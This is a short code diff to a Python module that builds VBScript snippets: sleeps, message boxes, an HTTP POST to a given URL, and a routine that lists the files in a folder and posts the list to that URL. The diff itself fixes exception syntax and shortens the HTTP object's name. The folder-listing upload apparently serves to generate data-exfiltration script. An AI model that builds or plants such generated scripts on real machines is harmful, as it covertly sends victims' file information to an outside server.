@@ -2,20 +2,20 @@
 def add_sleep(origin, time):
     try:
         return "%sWScript.Sleep %d\n"%(origin, time)
-    except Exception(e) :
+    except Exception as e:
         return origin+"WScript.Sleep 10000\n"
 
 def add_msgbox(origin, msg):
     try:
         return "%sMsgBox \"%s\"\n"%(origin, msg)
-    except Exception(e) :
+    except Exception as e :
         return origin+"MsgBox \" \"\n"
 
 def add_post(origin, url, objn):
     try:
-        return "%shttp.open \"POST\", \"%s\", False\n"%(origin, url) + \
-            "http.send %s"%objn
-    except Exception(e):
+        return "%sA.open \"POST\", \"%s\", False\n"%(origin, url) + \
+            "A.send %s"%objn
+    except Exception as e:
         return origin
 
 def add_post_folder(origin, url, path):
@@ -29,7 +29,7 @@ def add_post_folder(origin, url, path):
             "ret=ret&\"f-\"&file.name&\",\"\nNext\n"
         ret = add_post(ret, url, "ret")
         return ret
-    except Exception(e):
+    except Exception as e:
         print(e.message)
         return origin
 
